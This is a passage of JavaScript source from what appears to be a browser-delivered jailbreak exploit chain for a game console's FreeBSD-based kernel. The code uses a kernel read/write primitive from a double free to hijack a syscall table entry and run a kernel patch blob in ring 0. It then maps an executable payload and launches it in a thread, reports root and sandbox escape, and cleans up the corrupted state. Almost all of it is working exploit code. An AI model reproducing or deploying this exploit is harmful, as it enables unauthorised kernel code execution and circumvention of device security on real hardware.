                                        + "jmp qword [rsi]", gadgetOk,
                                        gadgetOk ? "so syscall 661 transfers to "
                                            + "args[0], which is the address we pass "
                                            + "to kexec"
                                            : wouldExecArgs
                                            ? "REFUSING -- this is ff e6, `jmp rsi`, "
                                            + "which would execute the argument array "
                                            + "itself rather than jump through it"
                                            : "REFUSING -- a wrong sy_call is a panic "
                                            + "on the next syscall 661");

                                    const syNarg = kview(sysent).getUint32(0, true);
                                    const syCall = kview(sysent).getBInt(8, true);
                                    const syThrcnt = kview(sysent).getUint32(0x2c, true);
                                    mark("KPATCH-SYSENT", sysent + "  sy_narg=" + syNarg
                                        + " sy_call=" + syCall + " sy_thrcnt=" + syThrcnt);
                                    const sysentOk = syNarg <= 8 && inImageAddr(syCall)
                                        && syThrcnt <= 8;
                                    check("sysent661-sysent-entry",
                                        sysentOk, sysentOk
                                            ? "sy_call points into the kernel image and "
                                            + "sy_narg is a plausible argument count"
                                            : "REFUSING -- this is not sysent, and "
                                            + "writing here would corrupt something else");

                                    const site = alloc(8);
                                    const siteLog = [], siteBad = [];
                                    for (let i = 0; i < KPATCH_JMP_SITES.length; ++i) {
                                        const off2 = KPATCH_JMP_SITES[i];
                                        site.u8.fill(0);
                                        kv.kread(site.addr, kbase.add32(off2), 1);
                                        const b = site.u8[0];
                                        const good = (b >= 0x70 && b <= 0x7f) || b === 0xeb;
                                        siteLog.push("0x" + off2.toString(16) + ":"
                                            + hexByte(b) + (b === 0xeb ? "*" : ""));
                                        if (!good) siteBad.push("0x" + off2.toString(16)
                                            + "=" + hexByte(b));
                                    }
                                    mark("KPATCH-SITES", siteLog.join(" ")
                                        + "   (* = already 0xeb)");

                                    const sitesOk = siteBad.length === 0
                                        && KPATCH_JMP_SITES.length >= 4;
                                    check("site-blob-makes-unconditional"
                                        + "currently holds a conditional jump", sitesOk,
                                        sitesOk ? "so the blob was built for this kernel "
                                            + "and kbase agrees with the LSTAR-0x1c0 the "
                                            + "blob will compute for itself"
                                            : "REFUSING -- " + siteBad.join(" "));

                                    if (!(gadgetOk && sysentOk && sitesOk)) {
                                        mark("KPATCH-REFUSED", "one of the three gates "
                                            + "failed. sysent was not touched, no memory "
                                            + "was mapped and nothing was executed.");
                                    } else {

                                        const size = (kpatch.length + 0x3fff) & ~0x3fff;
                                        const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
                                        const execFd = scAny(SYS_JITSHM_CREATE, 0, size,
                                            prot).i32;
                                        const mm = scAny(SYS_MMAP, KEXEC_MAP, size, prot,
                                            MAP_SHARED | MAP_FIXED, execFd, 0);
                                        const mapped = new int64(mm.lo, mm.hi);
                                        mark("KPATCH-MAP", "jitshm_create(0, 0x"
                                            + size.toString(16) + ", rwx) = " + execFd
                                            + "   mmap(" + KEXEC_MAP + ") = " + mapped);
                                        const mapOk = execFd >= 0 && mm.i32 !== -1
                                            && sameI64(mapped, KEXEC_MAP);
                                        check("632-bytes-rwx-memory-address"
                                            + "the reference uses", mapOk,
                                            mapOk ? "" : "jitshm/mmap refused");

                                        if (mapOk) {

                                            for (let o = 0; o < kpatch.length; o += 8) {
                                                let lo = 0, hi = 0;
                                                for (let k = 0; k < 4; ++k)
                                                    lo |= (kpatch[o + k] || 0) << (8 * k);
                                                for (let k = 0; k < 4; ++k)
                                                    hi |= (kpatch[o + 4 + k] || 0) << (8 * k);
                                                p.write8(mapped.add32(o),
                                                    new int64(lo >>> 0, hi >>> 0));
                                            }

                                            let copied = true;
                                            for (let o = 0; o < kpatch.length && copied;
                                                 o += 8) {
                                                const w = p.read8(mapped.add32(o));
                                                for (let k = 0; k < 8; ++k) {
                                                    const want = kpatch[o + k];
                                                    if (want === undefined) continue;
                                                    const got = k < 4
                                                        ? (w.low >>> (8 * k)) & 0xff
                                                        : (w.hi >>> (8 * (k - 4))) & 0xff;
                                                    if (got !== want) { copied = false; break; }
                                                }
                                            }
                                            const headBack = p.read8(mapped);
                                            mark("KPATCH-COPY", kpatch.length
                                                + " bytes written to " + mapped
                                                + ", first qword reads " + headBack);
                                            check("blob-rwx-memory-byte"
                                                + "byte", copied, "");

                                            if (copied && params.get("patch") === "0") {
                                                mark("KEXEC-WITHHELD", "?patch=0 -- "
                                                    + "sysent was NOT modified and the "
                                                    + "blob was NOT executed. Everything "
                                                    + "up to that point is proven above.");
                                            } else if (copied) {

                                                kview(sysent).setUint32(0, 2, true);
                                                kview(sysent).setBInt(8, gadget, true);
                                                kview(sysent).setUint32(0x2c, 1, true);
                                                const armed = sameI64(
                                                    kview(sysent).getBInt(8, true), gadget);
                                                mark("SYSENT-ARMED", "sy_call -> " + gadget
                                                    + (armed ? "  confirmed" : "  MISMATCH"));

                                                let kexecRet = -2;
                                                if (armed) kexecRet = scAny(SYS_KEXEC,
                                                    mapped).i32;

                                                kview(sysent).setUint32(0, syNarg, true);
                                                kview(sysent).setBInt(8, syCall, true);
                                                kview(sysent).setUint32(0x2c, syThrcnt, true);
                                                const restored =
                                                    sameI64(kview(sysent).getBInt(8, true),
                                                        syCall)
                                                    && kview(sysent).getUint32(0, true)
                                                        === syNarg
                                                    && kview(sysent).getUint32(0x2c, true)
                                                        === syThrcnt;
                                                mark("KEXEC", "syscall(661, " + mapped
                                                    + ") = " + kexecRet
                                                    + "   sysent restored=" + restored);
                                                check("sysent661-put"
                                                    + "as it was", restored,
                                                    restored ? "" : "sy_call is still the "
                                                        + "gadget -- do not call 661");
                                                check("blob-ran-ring-0"
                                                    + "returned 0", kexecRet === 0,
                                                    "kexec returned " + kexecRet);

                                                const after2 = [], stillCond = [];
                                                for (let i = 0;
                                                     i < KPATCH_JMP_SITES.length; ++i) {
                                                    const off2 = KPATCH_JMP_SITES[i];
                                                    site.u8.fill(0);
                                                    kv.kread(site.addr, kbase.add32(off2), 1);
                                                    const b = site.u8[0];
                                                    after2.push("0x" + off2.toString(16)
                                                        + ":" + hexByte(b));
                                                    if (b !== 0xeb) stillCond.push(
                                                        "0x" + off2.toString(16));
                                                }
                                                mark("KPATCH-VERIFY", after2.join(" "));
                                                const patchedOk = stillCond.length === 0;
                                                check("gated-site-reads-0xeb"
                                                    + "read back out of live kernel "
                                                    + "memory", patchedOk,
                                                    patchedOk ? "the kernel's own text "
                                                        + "changed under us -- that is "
                                                        + "the patch, and nothing in "
                                                        + "userland could have done it"
                                                        : "still conditional: "
                                                        + stillCond.join(" "));
                                                kpatched = kexecRet === 0 && patchedOk
                                                    && restored;
                                                if (kpatched) {
                                                    mark("KERNEL-PATCHED",
                                                        (kpatchName || "the blob")
                                                        + " applied and verified "
                                                        + "(main.js:106-116).");
                                                    if (PATCH_SETTLE > 0) {
                                                        mark("PATCH-SETTLE",
                                                            "ms=" + PATCH_SETTLE);
                                                        settle(PATCH_SETTLE);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                } catch (e) {
                                    mark("KPATCH-THREW", (e && e.message)
                                        ? e.message : String(e));
                                }

                                const MAP_PRIVATE = 2, MAP_ANONYMOUS = 0x1000;
                                if (!kpatched) {
                                    mark("PAYLOAD-SKIPPED", "reason=kpatch-incomplete");
                                }
                                if (!payload) {
                                    mark("PAYLOAD-NONE", "payload.bin was not loaded");
                                }

                                if (payload && params.get("payload") === "0")
                                    mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                else if (payload && (kpatched || params.get("payload") === "1"))
                                    try {
                                    state("stage 10: loading the payload...", "warn");

                                    const psize = (payload.length + 0x3fff) & ~0x3fff;
                                    const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
                                    const em = scAny(SYS9.mmap, 0, psize, pr,
                                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                                    const entry = new int64(em.lo, em.hi);
                                    mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
                                        + ", rwx, PRIVATE|ANON) = " + entry);
                                    const entryOk = em.i32 !== -1
                                        && !(entry.low === 0 && entry.hi === 0);
                                    check("the payload has " + payload.length
                                        + " bytes of anonymous RWX to live in",
                                        entryOk, entryOk ? "" : "mmap refused");

                                    if (entryOk) {

                                        const tCopy = Date.now();
                                        for (let o = 0; o < payload.length; o += 8) {
                                            let lo = 0, hi = 0;
                                            for (let k = 0; k < 4; ++k)
                                                lo |= (payload[o + k] || 0) << (8 * k);
                                            for (let k = 0; k < 4; ++k)
                                                hi |= (payload[o + 4 + k] || 0) << (8 * k);
                                            p.write8(entry.add32(o),
                                                new int64(lo >>> 0, hi >>> 0));
                                        }
                                        const copyMs = Date.now() - tCopy;
                                        const tVer = Date.now();
                                        let bad = -1;
                                        for (let o = 0; o < payload.length && bad < 0;
                                             o += 8) {
                                            const w = p.read8(entry.add32(o));
                                            for (let k = 0; k < 8; ++k) {
                                                const want = payload[o + k];
                                                if (want === undefined) continue;
                                                const got = k < 4
                                                    ? (w.low >>> (8 * k)) & 0xff
                                                    : (w.hi >>> (8 * (k - 4))) & 0xff;
                                                if (got !== want) { bad = o + k; break; }
                                            }
                                        }
                                        const verMs = Date.now() - tVer;
                                        mark("PAYLOAD-COPY", payload.length
                                            + " bytes to " + entry + " in " + copyMs
                                            + " ms, verified in " + verMs + " ms"
                                            + (bad < 0 ? "" : "  MISMATCH at +0x"
                                                + bad.toString(16)));
                                        check("byte-payload-rwx"
                                            + "memory", bad < 0,
                                            bad < 0 ? "read back through the same "
                                                + "primitive that wrote it" : "");

                                        const PTHREAD_CREATE_RVA = 0x2068;
                                        const cand = webkitBase.add32(PTHREAD_CREATE_RVA);
                                        const cb = [];
                                        for (let i = 0; i < 16; ++i)
                                            cb.push(p.read1(cand.add32(i)));
                                        mark("PTHREAD-BYTES", cand + " (webkit+0x"
                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
                                            + hexBytes(cb));

                                        const alt = libkernelBase.add32(PTHREAD_CREATE_RVA);
                                        const ab = [];
                                        for (let i = 0; i < 16; ++i)
                                            ab.push(p.read1(alt.add32(i)));
                                        mark("PTHREAD-BYTES-ALT", alt + " (libkernel+0x"
                                            + PTHREAD_CREATE_RVA.toString(16) + ") reads "
                                            + hexBytes(ab));

                                        let target = null, how = "";
                                        if (cb[0] === 0xff && cb[1] === 0x25) {

                                            const rel = (cb[2] | (cb[3] << 8)
                                                | (cb[4] << 16) | (cb[5] << 24)) | 0;
                                            const got = rel >= 0 ? cand.add32(6 + rel)
                                                : cand.add32(6).sub32(-rel);
                                            const fn2 = p.read8(got);
                                            const nearK = fn2.hi === libkernelBase.hi;
                                            const nearW = fn2.hi === webkitBase.hi;
                                            mark("PTHREAD-THUNK", "jmp qword [rip"
                                                + (rel < 0 ? "" : "+") + rel + "]  GOT "
                                                + got + " -> " + fn2
                                                + (nearK ? "  (libkernel+0x"
                                                    + ((fn2.low - libkernelBase.low) >>> 0)
                                                        .toString(16) + ")"
                                                 : nearW ? "  (webkit+0x"
                                                    + ((fn2.low - webkitBase.low) >>> 0)
                                                        .toString(16) + ")" : ""));
                                            if (fn2.hi > 0 && (fn2.low & 7) === 0
                                                || nearK || nearW) {
                                                target = cand; how = "import thunk";
                                            }
                                        } else if (cb[0] === 0xf3 && cb[1] === 0x0f
                                            && cb[2] === 0x1e && cb[3] === 0xfa) {
                                            target = cand; how = "endbr64 prologue";
                                        } else if (cb[0] === 0x55
                                            || (cb[0] === 0x48 && cb[1] === 0x83)
                                            || (cb[0] === 0x41 && cb[1] === 0x57)) {
                                            target = cand; how = "function prologue";
                                        }

                                        if (off.wk___imp_pthread_create !== undefined
                                            && off.k_pthread_create !== undefined) {
                                            const slot = webkitBase.add32(
                                                off.wk___imp_pthread_create);
                                            const fnT = p.read8(slot);
                                            const expect = libkernelBase.add32(
                                                off.k_pthread_create);
                                            const agree = sameI64(fnT, expect);
                                            mark("PTHREAD-TABLE", "GOT slot " + slot
                                                + " -> " + fnT + "   libkernel+0x"
                                                + off.k_pthread_create.toString(16)
                                                + " = " + expect
                                                + (agree ? "   AGREE" : "   DISAGREE"
                                                    + " -- not using it"));
                                            if (agree) {
                                                target = expect;
                                                how = "offsets table, GOT slot "
                                                    + "cross-checked against "
                                                    + "libkernel's own RVA";
                                            }
                                        }

                                        const forced = params.get("forcepthread") === "1";
                                        check("pthread_create was identified",
                                            !!target,
                                            target ? how + " -- calling it"
                                                : "neither a thunk nor a prologue. The "
                                                + "payload stays mapped at " + entry
                                                + " and is NOT launched. Read "
                                                + "PTHREAD-BYTES above and fix the "
                                                + "offset, or ?forcepthread=1.");

                                        if (!target && forced) {
                                            target = cand; how = "forced";
                                            mark("PTHREAD-FORCED", "?forcepthread=1 -- "
                                                + "calling " + cand + " anyway");
                                        }

                                        if (target && bad < 0) {
                                            const thr = alloc(8);
                                            thr.u8.fill(0);
                                            const rc = callAddr(target, thr.addr, 0,
                                                entry, 0).i32;
                                            const handle = new int64(
                                                thr.dv.getUint32(0, true),
                                                thr.dv.getUint32(4, true));
                                            let tid = null;
                                            if (handle.hi > 0) tid = p.read8(handle);
                                            mark("PTHREAD-CREATE", "pthread_create(&t, "
                                                + "0, " + entry + ", 0) = " + rc
                                                + "   handle=" + handle
                                                + "   id=" + (tid || "?"));
                                            const launched = rc === 0 && handle.hi > 0;
                                            check("payload-thread-created",
                                                launched, launched
                                                    ? "pthread_create returned 0 and "
                                                    + "wrote back a thread handle"
                                                    : "returned " + rc);
                                            payloadRunning = launched;
                                            if (launched)
                                                mark("PAYLOAD-RUNNING", "bytes="
                                                    + payload.length + " entry="
                                                    + entry);

                                                if (PAYLOAD_SETTLE > 0) {
                                                    mark("PAYLOAD-SETTLE",
                                                        "ms=" + PAYLOAD_SETTLE);
                                                    settle(PAYLOAD_SETTLE);
                                                    mark("PAYLOAD-ALIVE",
                                                        "getpid=" + scAny(SYS.getpid).i32
                                                        + " after=" + PAYLOAD_SETTLE + "ms");
                                                }
                                        } else if (!target) {
                                            mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
                                                "the payload is at " + entry
                                                + " with RWX and verified byte for "
                                                + "byte. Only the launch is missing.");
                                        }
                                    }
                                } catch (e) {
                                    mark("PAYLOAD-THREW", (e && e.message)
                                        ? e.message : String(e));
                                }
                                }
                            }
                            }
                        } catch (e) {
                            mark("KERNELVIEW-THREW", (e && e.message)
                                ? e.message : String(e));
                            mark("KERNELVIEW-ABORTED", "the pipe primitive did "
                                + "not come up. Nothing below depends on it and "
                                + "the kernel R/W proofs above still stand.");
                        }
                } else {
                    mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
                        + "was unavailable, so the ofiles walk never ran and "
                        + "there is nothing to aim the pipebuf at");
                }

                mark("STAGE-5-DONE", "karw=pktopts-fd" + pktoptsTwins[0]
                    + " kv=" + (kv ? "up" : "down"));

                return true;

            })();
            check("stage 2 completed", leakOk, "");

        } else if (committed) {
            mark("DANGLING", "the chunk was freed twice and NOT reclaimed. "
                + "kernel data may alias it. reboot the console now.");
            rebootRequired = true;
        }

        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
        if (twins) {
            mark("VERDICT", payloadRunning
                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
                : kpatched
                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=0"
                : jailbroken
                ? "karw=1 root=1 sandbox=escaped kpatch=0"
                : repaired
                ? "karw=1 repair=1 root=0"
                : kv
                ? "karw=1 repair=0 root=0"
                : "doublefree=1 reclaim=1 karw=pktopts kv=0");

            state(repaired ? "REPAIRED -- tearing down..."
                : kv ? "KERNELVIEW LIVE -- REBOOT"
                     : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
            if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
                + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
        } else if (committed) {
            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
        } else if (failCount === 0) {
            state("no win in " + attemptsUsed + " attempts", "warn");
        } else {
            state("see log", "bad");
        }

    } catch (e) {
        mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
        state("FAILED -- see log", "bad");
    } finally {

        const teardown = !committed || repaired;
        try {
            if (!teardown) {
                mark("CLEANUP-SKIPPED", "the 0x80 chunk was freed twice and the "
                    + "repair did not verify. every further syscall is another "
                    + "chance for the kernel to touch it, so nothing is torn "
                    + "down beyond the scheduler and the userland corruptions.");
            } else if (sc && mFunctionPatched) {

                let n = 0;
                for (let i = 0; i < openFds.length; ++i)
                    if (openFds[i] > 0 && sc(SYS.close, openFds[i]).i32 === 0) n++;
                mark("FDS-CLOSED", n + "/" + openFds.length + " block/loopback fds"
                    + (pipeFdsHeld ? "   pipes " + pipeFdsHeld
                        + " deliberately left open, +1 reference each" : ""));
            }
        } catch (e) {
            mark("FD-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (sc && mFunctionPatched && liveAioIds.length && teardown) {
                const idBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
                const idDv = new DataView(idBuf);
                const idAddr = (function () {
                    const cell = p.leakval(idBuf);
                    const impl = p.read8(cell.add32(0x10));
                    return p.read8(impl.add32(0x10));
                })();
                const outBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
                const outAddr = (function () {
                    const cell = p.leakval(outBuf);
                    const impl = p.read8(cell.add32(0x10));
                    return p.read8(impl.add32(0x10));
                })();
                keepAlive.push(idBuf, idDv, outBuf);
                let done = 0;
                for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
                    for (let j = 0; j < step; ++j)
                        idDv.setUint32(j * 4, liveAioIds[i + j], true);
                    sc(SYS.aio_multi_poll, idAddr, step, outAddr);
                    sc(SYS.aio_multi_delete, idAddr, step, outAddr);
                    done += step;
                }
                mark("AIO-CLEANED", done + " sprayed ids deleted exactly once");
            }
        } catch (e) {
            mark("AIO-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (teardown && sc && mFunctionPatched) {
                let n = 0;
                for (let i = 0; i < ipv6Socks.length; ++i)
                    if (ipv6Socks[i] > 0 && sc(SYS.close, ipv6Socks[i]).i32 === 0) n++;
                mark("IPV6-SOCKS-CLOSED", n + "/" + ipv6Socks.length
                    + " reclaim sockets; each still owned its own rthdr");
            }
        } catch (e) {
            mark("IPV6-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (teardown && sc && mFunctionPatched && pktoptsTwins.length) {

                const r = [];
                for (let i = 0; i < pktoptsTwins.length; ++i)
                    if (pktoptsTwins[i] > 0)
                        r.push(pktoptsTwins[i] + ":"
                            + sc(SYS.close, pktoptsTwins[i]).i32);
                mark("PKTOPTS-TWINS-CLOSED", r.join("  ")
                    + "   (fd " + pktoptsTwins[0] + " is the single free of the "
                    + "0x100 chunk at " + (repaired ? "the audited address" : "?")
                    + ")");
            }
        } catch (e) {
            mark("PKTOPTS-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (teardown && sc && mFunctionPatched && twinSocks.length) {
                const r = [];
                for (let i = 0; i < twinSocks.length; ++i)
                    if (twinSocks[i] > 0)
                        r.push(twinSocks[i] + ":" + sc(SYS.close, twinSocks[i]).i32);
                mark("RTHDR-TWINS-CLOSED", r.join("  ")
                    + "   (rthdr nulled, so the 0x80 chunk is freed by nobody "
                    + "and leaks)");
            }
        } catch (e) {
            mark("RTHDR-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (teardown && kvProbe) {
                const r = kvProbe();
                mark("POST-CLEANUP-READ", "kv reads " + (r.word || "null")
                    + " as '" + r.str + "' after every socket is closed");
                check("kernel-r-w-primitive-survives",
                    r.str === "evf cv", "got '" + r.str + "'");
                cleanupDone = r.str === "evf cv";

                let soak = 0;
                for (let i = 0; i < 10; ++i) {
                    await new Promise(function (res) { setTimeout(res, 200); });
                    if (sc(SYS.getpid).i32 > 0 && kvProbe().str === "evf cv") soak++;
                }
                mark("SOAK", soak + "/10 checks over 2 s: getpid and an 8-byte "
                    + "kernel read both still work");
                check("console-standing-2-s-after",
                    soak === 10, soak + "/10");
            } else if (teardown) {
                cleanupDone = true;
                mark("POST-CLEANUP", "no kv probe was installed, so cleanup is "
                    + "unproven beyond the close() return values");
            }
        } catch (e) {
            mark("POST-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (sc && mFunctionPatched && savedMask && savedPrio && restoreCtx) {
                const mb = restoreCtx.maskBuf, pb = restoreCtx.prioBuf;
                const ID = new int64(0xffffffff, 0xffffffff);
                mb.u8.fill(0);
                mb.dv.setUint32(0, savedMask.low, true);
                mb.dv.setUint32(4, savedMask.hi, true);
                const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                    CPU_WHICH_TID, ID, 0x10, mb.addr).i32;
                pb.dv.setUint16(0, savedPrio[0], true);
                pb.dv.setUint16(2, savedPrio[1], true);
                const pr = sc(SYS.rtprio_thread, RTP_SET, 0, pb.addr).i32;

                mb.u8.fill(0);
                sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                    ID, 0x10, mb.addr);
                const backMask = new int64(mb.dv.getUint32(0, true),
                                           mb.dv.getUint32(4, true));
                pb.dv.setUint16(0, 0xffff, true);
                pb.dv.setUint16(2, 0xffff, true);
                sc(SYS.rtprio_thread, RTP_LOOKUP, 0, pb.addr);
                const backPrio = [pb.dv.getUint16(0, true), pb.dv.getUint16(2, true)];
                const good = sameI64(backMask, savedMask)
                    && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
                mark("THREAD-ATTRS-RESTORED",
                    "affinity set=" + ar + " reads " + backMask
                    + "   rtprio set=" + pr + " reads {" + backPrio + "}"
                    + "   wanted " + savedMask + " {" + savedPrio + "}"
                    + (good ? "  ok" : "  MISMATCH -- the next page load will "
                       + "run on a mis-scheduled main thread"));
            }
        } catch (e) {
            mark("THREAD-ATTRS-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (workerArmed && rpc) {
                const d = await rpc("disarm");
                mark("WORKER-DISARMED", "restored=" + d.restored
                    + " expm1(1)=" + d.expm1);
                workerArmed = false;
            }
        } catch (e) {
            mark("WORKER-DISARM-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (workerWired && window.p && wMasterAddr && origWorkerVector) {
                window.p.write8(wMasterAddr.add32(0x10), origWorkerVector);
                workerWired = false;
                mark("WORKER-UNWIRED", "master.m_vector restored");
            }
        } catch (e) {
            mark("WORKER-UNWIRE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
                window.p.write8(mainPivotAddr, mainSavedCell);
                cellCorrupted = false;
                mark("JSCELL-RESTORED", "late -- the window was left open");
            }
        } catch (e) { }
        try {
            if (mFunctionPatched && window.p && execAddr && origNative) {
                const a = execAddr.add32(0x28);
                window.p.write8(a, origNative);
                mFunctionPatched = false;
                const back = window.p.read8(a);
                const v = Math.expm1(1);
                mark("EXPM1-RESTORED", "m_function=" + back
                    + (sameI64(back, origNative) ? " ok" : " MISMATCH")
                    + "  expm1(1)=" + v
                    + (Math.abs(v - 1.718281828459045) < 1e-12 ? " ok" : " WRONG"));
            }
        } catch (e) {
            mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
        }

        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
            + " (incl. teardown)");

        const stillDirty = (rebootRequired || committed || committed2)
            && !(repaired && cleanupDone);
        if (stillDirty) {
            mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
                + "browser normally. power the console off and back on.");
            try {
                stateEl.textContent = "REBOOT THE CONSOLE";
                stateEl.className = "bad";
            } catch (e) { }
        } else if (repaired && cleanupDone) {
            mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
                + " chunkY=leaked-0x80 pipes=+1ref-each"
                + " leaks=2-pipe-pairs+0x80");
            mark("STEP-4Q-DONE", payloadRunning
                ? "chain=complete leftovers=none"
                : kpatched
                ? "repaired, torn down, root, kernel patched -- but the payload "
                  + "did not start. It is mapped and verified; only the launch "
                  + "is missing."
                : "the corrupted context is repaired and the environment is "
                  + "torn down" + (jailbroken ? ", and the process is root"
                    : "") + ". See the stage 8/9/10 marks for what is left.");
            try {
                stateEl.textContent = payloadRunning
                    ? "ALL DONE"
                    : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                    : jailbroken ? "ROOT -- NO REBOOT NEEDED"
                    : "REPAIRED -- NO REBOOT NEEDED";
                stateEl.className = "ok";
            } catch (e) { }
        }
    }
})();


})();
